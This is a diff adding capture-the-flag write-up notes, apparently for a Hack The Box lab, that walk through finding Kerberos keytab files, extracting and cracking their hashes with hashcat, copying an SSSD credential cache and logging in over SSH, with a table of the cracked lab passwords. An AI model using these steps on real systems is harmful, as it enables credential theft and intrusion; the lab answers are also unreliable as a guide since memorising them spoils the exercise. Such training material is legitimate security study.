@@ -605,3 +605,79 @@ PW: Password2
 `realm list`
 
 <figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+
+**Look for a keytab file that you have read and write access. Submit the file name as a response.**
+
+`find / -name`` `_`keytab`_` ``-ls 2>/dev/null`
+
+<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+
+* read\&write -> CARLOS.KEYTAB
+
+**Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.**
+
+`python3 /opt/keytabextract.py carlos.keytab`
+
+<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+
+`nano hash.txt`&#x20;
+
+`hashcat hash.txt -m 1000 -a 0 /usr/share/wordlists/rockyou.txt`
+
+<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+
+Password5
+
+<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+
+**Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstations' home directory.**
+
+`crontab -l`
+
+`python3 /opt/keytabextract.py svc_workstations._all.kt`
+
+<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+
+`nano hash.txt`
+
+`hashcat hash.txt -m 1000 -a 0 /usr/share/wordlists/rockyou.txt`
+
+<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+
+Password4
+
+
+
+
+
+| User   | PW        |
+| ------ | --------- |
+| david  | Password2 |
+| john   | Password3 |
+| svc    | Password4 |
+| carlos | Password5 |
+|        |           |
+
+<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+
+* `cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .`
+
+<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+
+## Cracking Files
+
+### Protected Files
+
+`ssh kira@10.129.16.180`
+
+PW: L0vey0u1!
+
+<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+
+###
+
+### Password Managers
